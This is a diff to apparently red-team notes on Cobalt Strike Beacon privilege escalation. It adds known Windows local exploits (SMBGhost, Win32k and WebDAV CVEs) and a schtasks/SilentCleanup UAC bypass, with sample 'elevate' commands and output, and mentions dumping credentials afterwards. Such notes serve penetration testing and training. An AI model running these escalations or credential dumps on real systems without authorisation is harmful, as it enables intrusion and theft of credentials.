@@ -553,7 +553,12 @@ Beacon Local Exploits
 
     Exploit                         Description
     -------                         -----------
+    cve-2020-0796                   SMBv3 Compression Buffer Overflow (SMBGhost) (CVE 2020-0796)
+    ms14-058                        TrackPopupMenu Win32k NULL Pointer Dereference (CVE-2014-4113)
+    ms15-051                        Windows ClientCopyImage Win32k Exploit (CVE 2015-1701)
+    ms16-016                        mrxdav.sys WebDav Local Privilege Escalation (CVE 2016-0051)
     svc-exe                         Get SYSTEM via an executable run as a service
+    uac-schtasks                    Bypass UAC with schtasks.exe (via SilentCleanup)
     uac-token-duplication           Bypass UAC with Token Duplication
 ```
 
@@ -562,16 +567,26 @@ Not all UAC bypasses are created equal, and does not have same `TokenPrivileges`
 ### svc-exe
 
 ```
-beacon> elevate svc-exe listener-4444-tcp
+beacon> elevate svc-exe tcp-4444
 Started service 96d2381 on .
 [+] established link to child beacon: 10.10.10.10
 ```
 > **Note**: The beacon obtained with `svc-exe` bypass will have the necessary token privileges to run post-ex commands such as `logonpasswords`.
 
+### uac-schtasks
+
+Similar to `svc-exe`.
+
+```
+beacon> elevate uac-schtasks tcp-4444
+[*] Tasked Beacon to run windows/beacon_bind_tcp (127.0.0.1:4444) in a high integrity context
+[+] established link to child beacon: 10.10.10.10
+```
+
 ### uac-token-duplication
 
 ```
-beacon> elevate uac-token-duplication listener-4444-tcp
+beacon> elevate uac-token-duplication tcp-4444
 Started service 96d2381 on .
 [+] established link to child beacon: 10.10.10.10
 ```
